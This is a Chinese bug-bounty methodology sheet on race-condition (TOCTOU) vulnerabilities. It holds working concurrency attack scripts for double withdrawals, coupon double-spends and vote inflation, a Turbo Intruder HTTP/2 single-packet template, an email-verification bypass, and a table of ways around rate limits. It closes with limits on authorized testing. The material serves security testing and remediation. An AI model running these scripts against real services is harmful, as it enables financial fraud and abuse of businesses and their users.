# 竞态条件（Race Condition / TOCTOU）

> 程序假设「读 → 判 → 写」是原子的，但并发请求让它不是。check-then-act 窗口内并发命中即可双花优惠券、超扣余额、绕过限额。SRC/赏金里命中即 P1：优惠券/余额双花 $500–$5k，金融场景可放大到 $15k+（Shopify 案例 15250 usd）。

**取材来源**：[MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)、[elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（12 份公开报告提炼，含 HTTP/2 单包攻击）、[SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)；权威公开源 PortSwigger「Smashing the State Machine」（James Kettle，DEF CON 31）。

---

## 1. 触发信号

- 一次性/限额类动作：优惠券、礼品卡、红包、邀请奖励、限购、限时试用、API key 配额
- 代码呈 check-then-act：先查「券是否已用 / 余额是否够 / 是否超限」，再单独执行写操作（两次 DB 操作之间即窗口）
- 客户端 JS 防重而非服务端原子性：`button.disabled = true` / `$('#btn').prop('disabled', true)` / `setState({ used: true })` [Claude-BugHunter]
- 响应头出现 `X-RateLimit-*`（有限流但可能非原子）、`X-Request-Id`（每请求独立追踪）、无 Cache-Control 的有状态操作 [Claude-BugHunter]
- 并发重放时出现：多个本应互斥的 `200 OK`、重复成功提示、数据库唯一约束报错（命中最后一道防线）、响应时间不一致（一个快其余慢 = 串行；全同速 = 并行处理）

## 2. 高频入口点

**URL 模式速查** [Claude-BugHunter]：

| 类别 | 路径 |
|---|---|
| 投票/赞 | `/vote` `/upvote` `/like` `/favorite` |
| 兑换/领取 | `/redeem` `/apply-coupon` `/use-code` `/claim` |
| 交易 | `/purchase` `/checkout` `/confirm-order` `/pay` `/transfer` `/withdraw` `/send-money` |
| 邀请/奖励 | `/invite` `/referral` `/accept-invite` |
| 升级/试用 | `/upgrade` `/activate` `/trial` |
| 删除/取消 | `/delete` `/deactivate` `/cancel` |
| 关注 | `/follow` `/subscribe` |

**典型场景 → 危害** [本地 src-hunter]：

| 场景 | 描述 |
|---|---|
| 余额超扣 | 100 元余额并发提现 100，提了 N 次 |
| 优惠券双花 | 一码用一次被并发用 N 次 |
| 限购抢单 | 限购 1 件被并发买走 N 件 |
| 邀请奖励 | 邀请同一用户多次得多次奖励 |
| 验证码/Token 重用 | 一次性 code 被并发消耗多次 |
| 唯一约束破坏 | 注册同名账号/同邮箱 |
| 状态机跳跃 | 同一订单同时「取消」和「发货」 |
| 文件上传 | 上传 + 验证 + 存储不原子 |

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **基线**：合法执行一次动作，确认单次语义（券标记已用 / 余额扣一次 / 投票 +1）。抓一份干净请求。
2. **并发同请求**：10–50 个完全相同的请求同时发出（先 20 起步）。看几个 `2xx`、几个约束报错。
3. **分析响应**：多个 `200`（本应互斥）→ 命中；数据库约束错误 → 竞态已发生但撞到最后防线（仍值得报）；响应时间全同速 → 后端并行处理（可竞态）。
4. **核对后端状态**：余额是否为负 / 券是否仍可用 / 投票数是否 +N——响应成功只是表象，状态才是证据。
5. **降并发定窗口**：用 5 → 3 → 2 并发重跑，摸清竞态窗口多窄、成功率多高 [Claude-BugHunter]。
6. **换账号/多会话**：新账号、不同订阅层级、不同服务节点（负载均衡多实例不共享进程内锁）[Claude-BugHunter]。

> 关键前置：现代目标优先走 HTTP/2 单包攻击，HTTP/1.1 顺序发送天然被 TCP 抖动拉宽窗口，几乎必输。先 `curl -sI --http2 https://target | grep -i "HTTP/2"` 确认目标是否支持 h2 [Claude-BugHunter]。

## 4. Payload 区（每条标注出处）

### 4.1 基础并发（通用脚本）`[本地 src-hunter / Claude-BugHunter]`

```python
# 余额超扣 PoC：余额 100，并发 50 次提 100 [本地 src-hunter]
import threading, requests

def withdraw():
    requests.post("https://target/api/withdraw",
                  json={"amount": 100},
                  headers={"Authorization": "Bearer X"})

threads = [threading.Thread(target=withdraw) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
# 检查后端余额：可能 -4900 / 多笔 SUCCESS

# 优惠券双花 PoC [本地 src-hunter]
def use_coupon():
    requests.post("https://target/api/order/create",
                  json={"productId": "X", "couponCode": "SAVE50"},
                  headers={"Authorization": "Bearer X"})

# asyncio 变体 [Claude-BugHunter]
import asyncio, aiohttp
async def race_request(session, url, payload, headers):
    async with session.post(url, json=payload, headers=headers) as r:
        return await r.text()

# curl 并发（15 个投票请求）[Claude-BugHunter]
for i in $(seq 1 15); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "https://target.com/api/vote" \
    -H "Cookie: session=YOUR_SESSION" \
    -H "Content-Type: application/json" \
    -d '{"report_id": "12345", "vote": "up"}' &
done
wait
```

### 4.2 不同请求组合（partial construction）`[Claude-BugHunter]`

针对「对象在建窗口内半可用」的 TOCTOU。示例——邮箱验证绕过（注册任意邮箱 + 空 token 确认）：

```
Request A:  POST /register  body: csrf=<csrf>&username=hacker&email=anything@exploit.net&password=pw
Request B:  GET  /confirm   params: token=   (空 token)
A、B 同窗并发，重复约 20 轮；成功后在用户行已建、验证 token 未设的窗口内用空 token 通过确认。
先 GET /register 拿新鲜 CSRF，再发批。成功后可登录新账号执行目标动作（如删用户）。
```

### 4.3 HTTP/2 单包攻击（single-packet / last-byte-sync）`[PortSwigger / Claude-BugHunter]`

```python
# Turbo Intruder：Engine.BURP2 提供 last-byte-sync，N 个请求同窗释放 [Claude-BugHunter]
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,      # 单 TCP 连接多路复用
                           requestsPerConnection=100,    # 最多 100 并发 H2 流
                           engine=Engine.BURP2)          # 关键行：单包引擎
    for i in range(30):                                  # 或 20，见下
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')                             # 一次性 TCP write 释放所有末字节

def handleResponse(req, interesting):
    if '200' in req.status:
        table.add(req)
```

原理（Kettle 单包攻击）[PortSwigger / Claude-BugHunter]：在单条 HTTP/2 连接上对每个请求先发 HEADERS 帧与「除最后一个字节外的 body」，不发 END_STREAM；服务器因未收到 END_STREAM 而缓冲等待。N 个请求都缓冲到位后，用一次 TCP write 发出 N 个各带 1 字节 + END_STREAM 的 DATA 帧，TCP 合并成一个 IP 包，服务器在同一调度 tick 内并发派发 N 个请求，竞态窗口从毫秒级缩到「worker 间 SELECT→UPDATE 的纳秒级」。

- 并发数经验值：单包 h2 从 `N=30` 起步，`T_single` < 10ms 的极快端点加到 100+ [Claude-BugHunter]
- 需要 N > 30（如 6 位 PIN 在 5 次限速窗口内爆破）：Flatt Security 2024「first-sequence-sync」扩展，用同步 TCP 首序号跨多连接把 10,000 个请求在 166ms 内送达 [Claude-BugHunter]

### 4.4 Bypass 矩阵 `[本地 src-hunter / Claude-BugHunter]`

| 防护 | 绕过 |
|---|---|
| 单连接限速 | 多连接 / HTTP/2 多路复用 |
| 同 IP 限频 | 多 IP / 代理池 |
| 每用户限速（先检查后计数） | 同时发请求——全部在计数前通过限速检查 |
| Idempotency-Key | 试不带 key / 试不同 key 但同业务 |
| 数据库唯一约束 | 大小写差异 `Hunter@x` vs `hunter@x`；部分履约（一成功一报错但都被记账） |
| Token 一次性 | 在 token 未标记「已用」前并发请求 |
| 队列串行化 | 多队列/多 worker 抢同一队列，窗口期打满 |
| 应用层进程内锁 | 多实例/负载均衡/CDN 不同节点绕开进程内 mutex |
| 「已用」检查在应用代码 | 检查与更新分离，两请求都在任一更新前通过检查 |

### 4.5 会话锁绕过 / DB 隔离 / 协议级技巧 `[Claude-Red]`

```python
# 会话锁绕过：PHP 默认 session_start() 锁会话文件，同会话并发被串行化。
# 先多次登录拿多个 PHPSESSID，给每个并发请求配不同会话 ID，绕开会话锁。
# [Claude-Red]

# 线程同步起点（所有线程等闸门同时放行）[Claude-Red]
import threading, time
start_gate = threading.Event()

def synchronized_request():
    start_gate.wait()  # 全部等 flag
    requests.post('https://target.com/api/withdraw', json={'amount': '100'},
                  headers={'Authorization': 'Bearer token'})

threads = [threading.Thread(target=synchronized_request) for _ in range(50)]
[t.start() for t in threads]
time.sleep(2)          # 确保全部就位
start_gate.set()       # 同时放行
```

**DB 隔离级别判定**（白盒/源码审计辅助）[Claude-Red]：

```sql
-- PostgreSQL：READ COMMITTED（默认）易竞态；SERIALIZABLE 最强
BEGIN TRANSACTION ISOLATION LEVEL READ COMMITTED;
SELECT balance FROM accounts WHERE id = 123;   -- ← 竞态窗口
UPDATE accounts SET balance = balance - 100 WHERE id = 123;
COMMIT;
-- MySQL/MariaDB：无 SELECT ... FOR UPDATE 即缺失行锁
SELECT * FROM accounts WHERE id = 123 FOR UPDATE;
```

**GraphQL / gRPC / WebSocket / Serverless** [Claude-Red]：

- GraphQL：单个 POST body 塞 20 个相同 mutation，重放一次测重复状态变更。
- gRPC：后端 commit 前开多个并发 `SendMsg` 帧。
- WebSocket：`ws.onopen` 里连发 50 条 `transfer` 消息测并发处理。
- Serverless（AWS Lambda/DynamoDB）：并发 invoke 同一 function；DynamoDB 看是否用 `ConditionExpression` 条件写（缺失即可竞态）。

### 4.6 常见根因（判定报告定性）`[Claude-BugHunter]`

1. check-then-act 无原子操作——读状态与写状态分两次 DB 操作。
2. 缺数据库级锁——用 ORM `find/filter` 而非 `SELECT ... FOR UPDATE`。
3. 乐观并发无版本校验——计数器/标记更新时不检查记录是否自读后已变。
4. 微服务 TOCTOU——服务 A 验资格、服务 B 执行，无跨服务原子事务。
5. 客户端「防重」——JS 置灰按钮，服务端未加固。
6. 事务外自增计数——`votes_count += 1; save()` 而非原子 `UPDATE ... SET votes = votes + 1 WHERE id = ?`。
7. 异步后台任务——资格同步校验、履约异步，第二请求在第一任务完成前通过检查。

## 5. 工具用法

```bash
# 确认 HTTP/2 支持（单包攻击前提）[Claude-BugHunter]
curl -sI --http2 https://target.com | grep -i "HTTP/2\|h2"

# Burp 2023.9+：Repeater 多 tab → 右键 "Send group in parallel (single-packet attack)" [Claude-Red]
# Turbo Intruder：见 4.3 模板，engine=Engine.BURP2
```

专用工具 [Claude-Red]：Racepwn（竞态测试框架）、Race-the-Web、Raceocat（raw-socket 重放，µs 级）、URL-Race-Condition-Scanner（从 Burp history 生成并竞态端点）。

源码审计 grep（白盒辅助）[Claude-BugHunter]：

```bash
grep -rn "find_by\|where.*first" --include="*.rb" | grep -v "lock"      # Rails 无 lock
grep -rn "SELECT.*WHERE" --include="*.php" | grep -v "FOR UPDATE"
grep -rn "\.get(\|\.filter(" --include="*.py" | grep -v "select_for_update"
```

## 6. 证据要求

**「已确认」必须满足** [Claude-BugHunter]：同一一次性动作被证明成功 ≥2 次（投票 +N / 余额双记 / 券双兑），且该状态有真实价值；能从头写 20 行脚本、5 次里至少 3 次稳定复现。

**PoC 模板** [本地 src-hunter]：

```
# 攻击前
GET /api/balance → {"balance":"100.00"}
# 并发攻击（脚本见附件 attack.py）
$ python3 attack.py
sent 50 concurrent withdraw(100) requests
# 攻击后
GET /api/balance → {"balance":"-4500.00"}
GET /api/transactions → 5 笔 SUCCESS withdraw 100
# 复现：共 5 轮，每轮 50 并发，平均成功 4 笔/轮（双花概率 80%）
```

**保存物**：攻击脚本 + 攻击前后账号状态截图 + 复现率统计。高价值竞态报告加分项：Turbo Intruder 触发 + Wireshark 抓包证明 N 个 END_STREAM 帧在同一 TCP 段（`tcpdump -i lo0 -w race.pcap port 443`，过滤 `tls and tcp.port==443`）[Claude-BugHunter]。

**CVSS 参考** [本地 src-hunter]：余额超扣（金融）7.5–9.1；优惠券双花 6.5–7.5；限购绕过 5.3–6.5；唯一约束破坏→提权 8.1。

**真实案例参考（定性影响用）** [Claude-BugHunter / 本地 src-hunter / Claude-Red]：

| 案例 | 子类 | 要点 |
|---|---|---|
| GitLab CVE-2022-4037 | 邮箱验证 TOCTOU | 两个并发 `POST /-/profile` 改不同邮箱，token 错投；Devise 先建 token 后落库 [Claude-BugHunter] |
| Worldcoin（Tools for Humanity） | 一机一号绕过 | ~20 并发验证请求，`canVerifyForAction` 无 DB 锁，$3,000 [Claude-BugHunter] |
| Stripe #1717650 / #1849626 | 券/折扣双兑 | 双 tab 同时 Pay；redemption 计数在扣款后自增无行锁，$250 / $5,000 [Claude-BugHunter] |
| Reverb.com #759247 | 礼品卡双兑 | `POST /gift_cards/redeem` 复制 N 份并发，$1,500 [Claude-BugHunter] |
| nopCommerce CVE-2024-58248 | 结算 TOCTOU | 双并发 `POST /checkout/PlaceOrder` 同一礼品卡，均下单成功 [Claude-BugHunter] |
| Shopify #300305 | 邮箱确认绕过 | 接管任意店铺，$15,250 [本地 src-hunter] |
| Docker CVE-2021-41091 / runc CVE-2019-5736 / Dirty COW CVE-2016-5195 | 内核/容器 TOCTOU | 权限检查与删除/写之间的竞态，容器逃逸/提权 [Claude-Red] |

## 7. 合规边界 / 不要做的事

- **禁**：实际提现真金白银。用测试环境/沙箱/平台允许的 demo 账号；只能生产则**主动联系平台**说明并发测试并约定退还机制。
- **禁**：并发刷别人的优惠券 / 邀请奖励；用读到的状态数据冒领他人权益。
- **限**：并发数 50 内，不 1000+（视为 DoS）；同一漏洞复现 5–10 次，不刷上千次。
- **报告**：附每次实验「前/中/后」数据，证明已停手；余额超扣测试后立即与风控沟通退还超扣金额。
- **脱敏**：涉及真实余额/交易单号打码，仅保留证明「重复成功」所需的最小字段。
